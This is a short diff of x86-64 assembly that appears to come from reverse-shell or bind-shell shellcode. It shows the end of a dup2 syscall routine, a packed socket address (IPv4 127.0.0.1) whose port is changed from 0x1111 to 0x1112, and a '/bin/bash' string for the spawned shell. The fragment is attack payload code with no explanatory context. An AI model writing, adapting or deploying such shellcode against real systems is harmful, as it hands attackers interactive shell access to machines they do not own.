@@ -63,5 +63,5 @@ _dup2:
 	syscall
 	ret
 	
-	addr dq 0x0100007f11110002
+	addr dq 0x0100007f11120002
 	shell db "/bin/bash",0
